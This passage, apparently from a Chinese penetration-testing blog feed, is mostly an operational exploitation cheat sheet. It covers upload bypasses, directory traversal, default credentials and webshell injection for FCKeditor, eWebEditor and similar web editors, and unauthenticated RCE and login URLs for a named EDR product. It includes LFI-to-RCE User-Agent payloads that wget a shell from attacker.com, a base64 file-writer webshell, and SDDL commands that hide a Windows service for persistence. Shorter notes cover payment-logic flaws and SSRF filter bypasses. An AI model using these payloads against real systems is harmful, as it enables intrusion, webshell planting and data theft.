FCKeditor</h3>\n<pre><code>版本\nFCKeditor/_whatsnew.html\n编辑器\nFCKeditor/_samples/default.html\nFCKeditor/_samples/default.html\nFCKeditor/_samples/asp/sample01.asp\nFCKeditor/_samples/asp/sample02.asp\nFCKeditor/_samples/asp/sample03.asp\nFCKeditor/_samples/asp/sample04.asp\nfckeditor/editor/filemanager/connectors/test.html\n上传\nFCKeditor/editor/filemanager/upload/test.html\nFCKeditor/editor/filemanager/browser/default/connectors/test.html\nFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector\nFCKeditor/editor/filemanager/connectors/test.html\nFCKeditor/editor/filemanager/connectors/uploadtest.html\n上传路径\nFCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/\nFCKeditor被动限制策略所导致的过滤不严问题\n影响版本: FCKeditor x.x &lt;= FCKeditor v2.4.3\n脆弱描述：FCKeditor v2.4.3中File类别默认拒绝上传类型：html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtmFckeditor 2.0 &lt;= 2.2允许上传asa、cer、php2、php4、inc、pwml、pht后缀的文件\n上传后 它保存的文件直接用的$sFilePath = $sServerDir . $sFileName，而没有使用$sExtension为后缀。直接导致在win下在上传文件后面加个.来突破[未测试]。而在apache下，因为”Apache文件名解析缺陷漏洞”也可以利用之，详见”附录A”另建议其他上传漏洞中定义TYPE变量时使用File类别来上传文件,根据FCKeditor的代码，其限制最为狭隘。攻击利用:\n允许其他任何后缀上传\n利用2003路径解析漏洞上传木马\n影响版本: 索引底部附录B\n脆弱描述：\n利用2003系统路径解析漏洞的原理，创建类似bin.asp如此一般的目录，再在此目录中上传文件即可被脚本解释器以相应脚本权限执行。\n攻击利用:\nfckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp\n强制建立shell.asp目录：\nFCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z&amp;uuid=1244789975684\nor\nFCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp\nFCKeditor PHP上传任意文件漏洞\n影响版本: FCKeditor 2.2 &lt;= FCKeditor 2.4.2\n脆弱描述：FCKeditor在处理文件上传时存在输入验证错误，远程攻击可以利用此漏洞上传任意文件。在通过editor/filemanager/upload/php/upload.php上传文件时攻击者可以通过为Type参数定义无效的值导致上传任意脚本。\n成功攻击要求config.php配置文件中启用文件上传，而默认是禁用的。攻击利用: (请修改action字段为指定网址)：\n&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://www.xxxx.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;\n&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;\n&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;\n&lt;/form&gt;\nNote:如想尝试v2.2版漏洞，则修改Type=任意值 即可，但注意，如果换回使用Media则必须大写首字母M,否则LINUX下，FCKeditor会对文件目录进行文件名校验，不会上传成功的。\nFCKeditor 暴路径漏洞\n影响版本：aspx版FCKeditor\n攻击利用：\nFCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/1.asp\nFCKeditor 文件上传“.”变“_”下划线的绕过方法\n影响版本: FCKeditor =&gt; 2.4.x\n脆弱描述：我们上传的文件例如：shell.php.rar或shell.php;.jpg会变为shell_php;.jpg这是新版FCK的变化。攻击利用:\n提交1.php+空格 就可以绕过去所有的,\n※不过空格只支持win系统 *nix是不支持的[1.php和1.php+空格是2个不同的文件]Note:http://pstgroup.blogspot.com/2007/05/tipsfckeditor.html\nFCKeditor 文件上传“.”变“_”下划线的绕过方法（二）\n影响版本:=&gt;2.4.x的最新版已修补脆弱描述:由于Fckeditor对第一次上传123.asp;123.jpg 这样的格式做了过滤。也就是IIS6解析漏洞。上传第一次。被过滤为123_asp;123.jpg 从而无法运行。\n但是第2次上传同名文件123.asp;123.jpg后。由于”123_asp;123.jpg”已经存在。\n文件名被命名为123.asp;123(1).jpg …… 123.asp;123(2).jpg这样的编号方式。\n所以。IIS6的漏洞继续执行了。如果通过上面的步骤进行测试没有成功，可能有以下几方面的原因：\n1.FCKeditor没有开启文件上传功能，这项功能在安装FCKeditor时默认是关闭的。如果想上传文件，FCKeditor会给出错误提示。\n2.网站采用了精简版的FCKeditor，精简版的FCKeditor很多功能丢失，包括文件上传功能。\n3.FCKeditor的这个漏洞已经被修复。\nFCKeditor 新闻组件遍历目录漏洞\n影响版本:Aspx与JSP版FCKeditor脆弱描述：如何获得webshell请参考上文“TYPE自定义变量任意上传文件漏洞”\n攻击利用:\n修改CurrentFolder参数使用 ../../来进入不同的目录\n/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=aspx.asp\n根据返回的XML信息可以查看网站所有的目录。\n/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F\n/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F\nTYPE自定义变量任意上传文件漏洞\n影响版本: 较早版本\n脆弱描述：通过自定义Type变量的参数，可以创建或上传文件到指定的目录中去，且没有上传文件格式的限制。攻击利用:\n/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&amp;Connector=connectors/asp/connector.asp\n打开这个地址就可以上传任何类型的文件了，Shell上传到的默认位置是:\nhttp://www.xxxx.com/UserFiles/all/1.asp\nType=all 这个变量是自定义的,在这里创建了all这个目录,而且新的目录没有上传文件格式的限制.比如输入:\n/FCKeditor/editor/filemanager/browser/default/browser.html?Type=../&amp;Connector=connectors/asp/connector.asp\n网马就可以传到网站的根目录下.Note:如找不到默认上传文件夹可检查此文件:\nfckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/\n</code></pre>\n<h3 id=\"ewebeditor\"><a class=\"anchor\" href=\"#ewebeditor\">#</a> eWebEditor</h3>\n<pre><code>eWebEditor 基础知识\n默认后台地址：\n/ewebeditor/admin_login.asp\n/WebEdior/admin/login.aspx\n建议最好检测下admin_style.asp文件是否可以直接访问默认数据库路径：\n[PATH]/db/ewebeditor.mdb\n[PATH]/db/db.mdb\n[PATH]/db/%23ewebeditor.mdb\n默认密码：\nadmin/admin888 、 admin/admin、 admin/123456 、admin/admin9991、点击“样式管理”—可以选择新增样式，或者修改一个非系统样式，将其中图片控件所允许的上传类型后面加上|asp、|asa、|aaspsp或|cer，只要是服务器允许执行的脚本类型即可，点击“提交”并设置工具栏—将“插入图片”控件添加上。而后—预览此样式，点击插入图片，上传WEBSHELL，在“代码”模式中查看上传文件的路径。\n2、当数据库被管理员修改为asp、asa后缀的时候，可以插一句话木马服务端进入数据库，然后一句话木马客户端连接拿下webshell\n3、上传后无法执行？目录没权限？帅锅你回去样式管理看你编辑过的那个样式，里面可以自定义上传路径的！！！\n4、设置好了上传类型，依然上传不了麽？估计是文件代码被改了，可以尝试设定“远程类型”依照6.0版本拿SHELL的方法来做（详情见下文↓），能够设定自动保存远程文件的类型。\n5、不能添加工具栏，但设定好了某样式中的文件类型，怎么办？↓这么办！\n(请修改action字段)\nAction.html\n6、需要突破上传文件类型限制么？Come here! —&gt;&gt; 将图片上传类型修改为“aaspsp;”(不含引号)，将一句话shell文件名改为“1.asp;”(不含引号)并上传即可。—&gt;本条信息来源：微笑刺客\neWebEditor 可下载数据库，但密文解不开\n脆弱描述：\n当我们下载数据库后查询不到密码MD5的明文时，可以去看看webeditor_style(14)这个样式表，看看是否有前辈入侵过 或许已经赋予了某控件上传脚本的能力，构造地址来上传我们自己的WEBSHELL.\n攻击利用:\n比如 ID=46 s-name =standard1构造 代码: ewebeditor.asp?id=content&amp;style=standardID和和样式名改过后\newebeditor.asp?id=46&amp;style=standard1\neWebEditor遍历目录漏洞\n脆弱描述：\newebeditor/admin_uploadfile.asp\nadmin/upload.asp\n过滤不严，造成遍历目录漏洞\n攻击利用:\n第一种:ewebeditor/admin_uploadfile.asp?id=14\n在id=14后面添加&amp;dir=..\n再加 &amp;dir=../..\n&amp;dir=http://www.xxxx.com/../.. 看到整个网站文件了\n第二种: ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =./..\neWebEditor 5.2 列目录漏洞\n脆弱描述：\newebeditor/asp/browse.asp\n过滤不严，造成遍历目录漏洞\n攻击利用：\nhttp://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/..\n利用eWebEditor session欺骗漏洞,进入后台\n脆弱描述：\n漏洞文件:Admin_Private.asp\n只判断了session，没有判断cookies和路径的验证问题。\n攻击利用:\n新建一个test.asp内容如下:\n&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;\n访问test.asp，再访问后台任何文件，for example:Admin_Default.asp\neWebEditor asp版 2.1.6 上传漏洞\n攻击利用:（请修改action字段为指定网址）\newebeditor asp版2.1.6上传漏洞利用程序.html\neWebEditor 2.7.0 注入漏洞\n攻击利用:\nhttp://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200\n默认表名：eWebEditor_System默认列名：sys_UserName、sys_UserPass，然后利用nbsi进行猜解.\neWebEditor2.8.0最终版删除任意文件漏洞\n脆弱描述：\n此漏洞存在于Example\\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入。\n攻击利用: (请修改action字段为指定网址)\nDel Files.html\neWebEditor PHP/ASP 后台通杀漏洞\n影响版本: PHP ≥ 3.0~3.8与asp 2.8版也通用，或许低版本也可以，有待测试。\n攻击利用:\n进入后台/eWebEditor/admin/login.php,随便输入一个用户和密码,会提示出错了.\n这时候你清空浏览器的url,然后输入javascript:alert(document.cookie=”adminuser=”+escape(“admin”));\njavascript:alert(document.cookie=”adminpass=”+escape(“admin”));\njavascript:alert(document.cookie=”admindj=”+escape(“1”));而后三次回车,清空浏览器的URL,现在输入一些平常访问不到的文件如../ewebeditor/admin/default.php，就会直接进去。\neWebEditor for php任意文件上传漏洞\n影响版本:ewebeditor php v3.8 or older version\n脆弱描述:\n此版本将所有的风格配置信息保存为一个数组$aStyle,在php.ini配置register_global为on的情况下我们可以任意添加自己喜欢的风格，并定义上传类型。\n攻击利用:\nphpupload.html\neWebEditor JSP版漏洞\n大同小异。\neWebEditor 2.8 商业版插一句话木马\n影响版本:=&gt;2.8 商业版\n攻击利用:\n登陆后台，点击修改密码—-新密码设置为 1&quot;:eval request(&quot;h&quot;)’\n设置成功后，访问asp/config.asp文件即可，一句话木马被写入到这个文件里面了.注意：可能因为转载的关系，代码会变掉，最好本地调试好代码再提交。\neWebEditorNet upload.aspx 上传漏洞(WebEditorNet)\n脆弱描述：\nWebEditorNet 主要是一个upload.aspx文件存在上传漏洞。\n攻击利用:\n默认上传地址：/ewebeditornet/upload.aspx\n可以直接上传一个cer的木马\n如果不能上传则在浏览器地址栏中输入javascript:lbtnUpload.click();\n成功以后查看源代码找到uploadsave查看上传保存地址，默认传到uploadfile这个文件夹里。\n</code></pre>\n<h3 id=\"southidceditor一般使用v280版eweb核心\"><a class=\"anchor\" href=\"#southidceditor一般使用v280版eweb核心\">#</a> southidceditor (一般使用 v2.8.0 版 eWeb 核心)</h3>\n<pre><code>http://www.xxxx.com/admin/southidceditor/datas/southidceditor.mdb\nhttp://www.xxxx.com/admin/southidceditor/admin/admin_login.asp\nhttp://www.xxxx.com/admin/southidceditor/popup.asp\nbigcneditor(eWeb 2.7.5 VIP核心)\n其实所谓的Bigcneditor就是eWebEditor 2.7.5的VIP用户版.之所以无法访问admin_login.asp，提示“权限不够”4字真言，估计就是因为其授权“Licensed”问题,或许只允许被授权的机器访问后台才对。或许上面\t针对eWebEditor v2.8以下低版本的小动作可以用到这上面来.貌似没多少动作Cute Editor\n</code></pre>\n<h3 id=\"cute-editor在线编辑器本地包含漏洞\"><a class=\"anchor\" href=\"#cute-editor在线编辑器本地包含漏洞\">#</a> Cute Editor 在线编辑器本地包含漏洞</h3>\n<pre><code>影响版本:\nCuteEditor For Net 6.4\n脆弱描述：\n可以随意查看网站文件内容，危害较大。\n攻击利用:\nhttp://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config\nCute Editor Asp.Net版利用iis解析漏洞获得权限\n影响版本：\nCuteEditor for ASP.NET中文版脆弱描述：\n脆弱描述：\nCuteEditor对上传文件名未重命名，导致其可利用IIS文件名解析Bug获得webshell权限。\n攻击利用：\n可通过在搜索引擎中键入关键字 inurl:Post.aspx?SmallClassID= 来找到测试目标。\n在编辑器中点击“多媒体插入”，上传一个名为“xxx.asp;.avi”的网马，以此获得权限。\n</code></pre>\n<h3 id=\"webhtmleditor\"><a class=\"anchor\" href=\"#webhtmleditor\">#</a> Webhtmleditor</h3>\n<pre><code>利用WIN 2003 IIS文件名称解析漏洞获得SHELL\n影响版本：&lt;= Webhtmleditor最终版1.7 (已停止更新)\n脆弱描述/攻击利用：\n对上传的图片或其他文件无重命名操作，导致允许恶意用户上传diy.asp;.jpg来绕过对后缀名审查的限制，对于此类因编辑器作者意识犯下的错误，就算遭遇缩略图，文件头检测，也可使用图片木马 插入一句话来突破。\n</code></pre>\n<h3 id=\"kindeditor\"><a class=\"anchor\" href=\"#kindeditor\">#</a> Kindeditor</h3>\n<pre><code>利用WIN 2003 IIS文件名称解析漏洞获得SHELL\n影响版本: &lt;= kindeditor 3.2.1(09年8月份发布的最新版)\n脆弱描述/攻击利用：\n拿官方做个演示：进入http://www.xxxx.com/ke/examples/index.html 随意点击一个demo后点图片上传，某君上传了如下文件：http://www.xxxx.com/ke/attached/test.asp;.jpg\nNote:参见附录C原理解析。\n</code></pre>\n<h3 id=\"freetextbox\"><a class=\"anchor\" href=\"#freetextbox\">#</a> Freetextbox</h3>\n<pre><code>Freetextbox遍历目录漏洞\n影响版本：未知\n脆弱描述：\n因为ftb.imagegallery.aspx代码中 只过滤了/但是没有过滤\\符号所以导致出现了遍历目录的问题。\n攻击利用:\n在编辑器页面点图片会弹出一个框（抓包得到此地址）构造如下，可遍历目录。\nhttp://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\\..\nFreetextbox Asp.Net版利用IIS解析漏洞获得权限\n影响版本：所有版本\n脆弱描述：\n没做登陆验证可以直接访问上传木马\nFreetextbox 3-3-1 可以直接上传任意格式的文件\nFreetextbox 1.6.3 及其他版本可以上传 格式为x.asp;.jpg\n攻击利用：\n利用IIS解析漏洞拿SHELL。上传后SHELL的路径为http://www.xxxx.com/images/x.asp;.jpg\n</code></pre>\n<h3 id=\"msn-editor\"><a class=\"anchor\" href=\"#msn-editor\">#</a> Msn editor</h3>\n<pre><code>利用WIN 2003 IIS文件名称解析漏洞获得SHELL\n影响版本：未知\n脆弱描述：\n点击图片上传后会出现上传页面，地址为\nhttp://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=\n用普通的图片上传后，地址为\nhttp://www.xxxx.com/news/uppic/41513102009204012_1.gif\n记住这时候的路径，再点击图片的上传，这时候地址就变成了\nhttp://www.xxxx.com/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012\n很明显。图片的地址是根据RemNum后面的编号生成的。\n攻击利用:\n配合IIS的解析漏洞，把RemNum后面的数据修改为1.asp;41513102009204012，变成下面这个地址\nhttp://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012\n然后在浏览器里打开，然后选择你的脚本木马上传，将会返回下面的地址\nuppic/1.asp;41513102009204012_2.gif\n直接打开是小马地址！\n</code></pre>\n<h3 id=\"ueditor\"><a class=\"anchor\" href=\"#ueditor\">#</a> Ueditor</h3>\n<pre><code>1.4.3.3 .net版本\n&lt;form action=&quot;http://xx.com/ueditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt;\n&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p&gt;\n&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;\n&lt;/form&gt;\n加载一个远程图片shell\n表单在远程图片后加?.aspx\n如 http://1.1.1.1/uploads/1.gif?.aspx\n</code></pre>\n<h2 id=\"宝塔面板未授权访问phpmyadmin\"><a class=\"anchor\" href=\"#宝塔面板未授权访问phpmyadmin\">#</a> 宝塔面板未授权访问 phpmyadmin</h2>\n<pre><code>宝塔Linux面板7.4.2版本\n宝塔Linux测试版7.5.13\nWindows面板6.8版本\n直接访问http://your_ip:888/pma\n</code></pre>\n<h2 id=\"深x服\"><a class=\"anchor\" href=\"#深x服\">#</a> 深 x 服</h2>\n<pre><code>EDR RCE\nhttps://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id 即可执行命令\n终端检测响应平台任意用户登录\nfofa: title=&quot;终端检测响应平台&quot;\ntarget+/ui/login.php?user=admin 即可直接登录\n</code></pre>\n<h2 id=\"天r信\"><a class=\"anchor\" href=\"#天r信\">#</a> 天 r 信</h2>\n<pre><code>默认用户superman的uid=1\nPOST /?module-auth_user&amp;action=mod_edit.pwd HTTP/1.1\n</code></pre>\n<h2 id=\"从lfi到rce\"><a class=\"anchor\" href=\"#从lfi到rce\">#</a> 从 LFI 到 RCE</h2>\n<pre><code>当有个lfi时\nhttps://www.website.com/index.php?pg=../../../../etc/passwd\n尝试包含/proc/self/environ\nhttps://www.website.com/index.php?pg=../../../../proc/self/environ\n若是存在user-agent标识\n修改ua来实现rce:\nUser-Agent: &lt;?system('wget http://attacker.com/shell.txt -O shell.php');?&gt;\nUser-Agent: &lt;?exec('wget http://attacker.com/shell.txt -O shell.php');?&gt;\nUser-Agent: &lt;?php phpinfo(); ?&gt;\n也可以在服务器内部来创建文件写入shell\nUser-Agent: &lt;?php $a = base64_decode('PD9waHAgCiAgJGEgPSAkX1BPU1RbJ2NvZGUnXTsKICAkZmlsZSA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwndycpOwogIEBmd3JpdGUoJGZpbGUsJGEpOwogIEBmY2xvc2UoJGZpbGUpOwo/Pgo8Y2VudGVyPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPgogICAgPGgyPkZpbGUgV3JpdGVyPC9oMj4KICAgIEZpbGUgTmFtZTxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgcGxhY2Vob2xkZXI9InNoZWxsLnBocCI+PGJyPgogICAgU2hlbGwgQ29kZTxicj48dGV4dGFyZWEgbmFtZT0iY29kZSIgZm9ybT0iZm9ybSIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgc2hlbGwgaGVyZSI+PC90ZXh0YXJlYT48YnI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iV3JpdGUiPgogIDwvZm9ybT4KPC9jZW50ZXI+Cg=='); $file = fopen('shell.php','w'); echo fwrite($file,$a); fclose($file); ?&gt;\n</code></pre>\n<h2 id=\"隐藏windows服务\"><a class=\"anchor\" href=\"#隐藏windows服务\">#</a> 隐藏 windows 服务</h2>\n<pre><code>Translate from: https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\nWindows的一个功能允许红队或攻击者将服务隐藏起来，从而为逃避基于主机的常见威胁搜寻技术的检测提供了机会。\n这里假设Fax服务是我们的恶意文件或后门\n打开services.msc可以看到服务\n</code></pre>\n<p><img data-src=\"849.png\" alt=\"\" /></p>\n<pre><code>执行命令可以看到服务\n</code></pre>\n<p><img data-src=\"850.png\" alt=\"\" /></p>\n<pre><code>管理员权限下执行以下命令，安全标识符定义语言(SDDL)\n</code></pre>\n<p><img data-src=\"851.png\" alt=\"\" /></p>\n<pre><code>&amp; $env:SystemRoot\\System32\\sc.exe sdset SWCUEngine &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;\n</code></pre>\n<p><img data-src=\"852.png\" alt=\"\" /></p>\n<pre><code>可以看到已经查询不到了\n</code></pre>\n<p><img data-src=\"853.png\" alt=\"\" /></p>\n<pre><code>在红队或渗透测试中，这可能是一种有用的技术，可以在受感染主机上保持持久性。重启后，隐藏的服务也会自动启动。\n取消隐藏的命令\n&amp; $env:SystemRoot\\System32\\sc.exe sdset SWCUEngine &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;\n</code></pre>\n",
            "tags": [
                "Pentest"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/",
            "title": "web漏洞-业务逻辑漏洞",
            "date_published": "2021-03-09T08:15:23.000Z",
            "content_html": "<h1 id=\"找回密码\"><a class=\"anchor\" href=\"#找回密码\">#</a> 找回密码</h1>\n<h1 id=\"支付漏洞\"><a class=\"anchor\" href=\"#支付漏洞\">#</a> 支付漏洞</h1>\n<p>直接改数据包中的金额，金额改动时多试一些值 <code>0.01、1、10、100、……</code></p>\n<p>数量改为 <code>-1</code>  个、 <code>9999999999</code>  超大数、 <code>小数</code> 四舍五入、五舍六入。<br />\n数量不能小于 <code>1</code> ，改为 <code>1.1、1.5、1.6</code> 。<br />\n数据包重放。</p>\n<p>运费的参数</p>\n<p>转账功能 转账金额改为负，别人给自己转钱</p>\n<p>订单号的更改（金额、商品）用便宜的订单去付费贵的商品</p>\n<h1 id=\"越权\"><a class=\"anchor\" href=\"#越权\">#</a> 越权</h1>\n<p>还是找关键参数</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE5NTgzNy5odG1s\">逻辑漏洞挖掘初步总结篇</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWC1jYWlqaS9wLzExMjA5OTYzLmh0bWw=\">Web 安全测试中常见逻辑漏洞解析（实战篇）</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5OTE2OTIvYXJ0aWNsZS9kZXRhaWxzLzgyOTUzMjEz\">常见逻辑漏洞</span></p>\n<p>挖掘出属于自己思维的逻辑漏洞。</p>\n",
            "tags": [
                "业务逻辑漏洞"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/",
            "title": "初学webshell检测",
            "date_published": "2021-03-02T09:51:07.000Z",
            "content_html": "<h1 id=\"webshell-流量特征\"><a class=\"anchor\" href=\"#webshell-流量特征\">#</a> WebShell 流量特征</h1>\n",
            "tags": [
                "webshell流量特征"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-SSRF/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-SSRF/",
            "title": "web漏洞-SSRF",
            "date_published": "2021-02-01T11:54:22.000Z",
            "content_html": "<h1 id=\"ssrf的定义与成因\"><a class=\"anchor\" href=\"#ssrf的定义与成因\">#</a> SSRF 的定义与成因</h1>\n<p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>\n<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p>\n<p>注释：除了 http/https 等方式可以造成 ssrf，类似 tcp connect 方式也可以探测内网一些 ip 的端口是否开发服务，只不过危害比较小而已。</p>\n<h1 id=\"可能出现的地方\"><a class=\"anchor\" href=\"#可能出现的地方\">#</a> 可能出现的地方</h1>\n<p>1. 社交分享功能：获取超链接的标题等内容进行显示</p>\n<p>2. 转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</p>\n<p>3. 在线翻译：给网址翻译对应网页的内容</p>\n<p>4. 图片加载 / 下载：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片</p>\n<p>5. 图片 / 文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验</p>\n<p>6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试</p>\n<p>7. 网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作</p>\n<p>8. 数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数</p>\n<p>9. 邮件系统：比如接收邮件服务器地址</p>\n<p>10. 编码处理，属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等</p>\n<p>11. 未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞</p>\n<p>一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>\n<p>12. 从远程服务器请求资源（upload from url 如 discuz！；import &amp; expost rss feed 如 web blog；使用了 xml 引擎对象的地方 如 wordpress xmlrpc.php）</p>\n<h1 id=\"漏洞验证\"><a class=\"anchor\" href=\"#漏洞验证\">#</a> 漏洞验证</h1>\n<p>1. 排除法：浏览器 f12 查看源代码看是否是在本地进行了请求</p>\n<p>比如：该资源地址类型为  <code>http://www.xxx.com/a.php?image=（地址）</code> 的就可能存在 SSRF 漏洞</p>\n<p>2.dnslog 等工具进行测试，看是否被访问</p>\n<p>-- 可以在盲打后台用例中将当前准备请求的 uri 和参数编码成 base64，这样盲打后台解码后就知道是哪台机器哪个 cgi 触发的请求。</p>\n<p>3. 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在 HTTP 服务的内网地址</p>\n<p>-- 从漏洞平台中的历史漏洞寻找泄漏的存在 web 应用内网地址</p>\n<p>-- 通过二级域名暴力猜解工具模糊猜测内网地址</p>\n<p>4. 直接返回的 Banner、title、content 等信息</p>\n<p>5. 留意 bool 型 SSRF</p>\n<h1 id=\"利用方式\"><a class=\"anchor\" href=\"#利用方式\">#</a> 利用方式</h1>\n<p>1. 让服务端去访问相应的网址</p>\n<p>2. 让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的 cms</p>\n<p>3. 可以使用 file、dict、gopher [11]、ftp 协议进行请求访问相应的文件</p>\n<p>4. 攻击内网 web 应用（可以向内部任意主机的任意端口发送精心构造的数据包 {payload}）</p>\n<p>5. 攻击内网应用程序（利用跨协议通信技术）</p>\n<p>6. 判断内网主机是否存活：方法是访问看是否有端口开放</p>\n<p>7.DoS 攻击（请求大文件，始终保持连接 keep-alive always）</p>\n<h1 id=\"绕过限制方法\"><a class=\"anchor\" href=\"#绕过限制方法\">#</a> 绕过限制方法</h1>\n<p>详细绕过参考 -----&gt;<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=\">https://www.secpulse.com/archives/65832.html</span></p>\n<p>1. <code>http://xxxx.com@www.baidu.com/</code>  与 <code>http://www.baidu.com/</code>  请求时是相同的</p>\n<p>2. 各种 IP 地址的进制转换</p>\n<p>可以是十六进制，八进制等。<br />\n115.239.210.26  &gt;&gt;&gt;  16373751032<br />\n 首先把这四段数字给分别转成 16 进制，结果：73 ef d2 1a<br />\n 然后把 73efd21a 这十六进制一起转换成 8 进制<br />\n记得访问的时候加 0 表示使用八进制 (可以是一个 0 也可以是多个 0 跟 XSS 中多加几个 0 来绕过过滤一样)，十六进制加 0x</p>\n<p>127.0.0.1 =&gt; 2130706433<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<p>3.URL 跳转绕过： 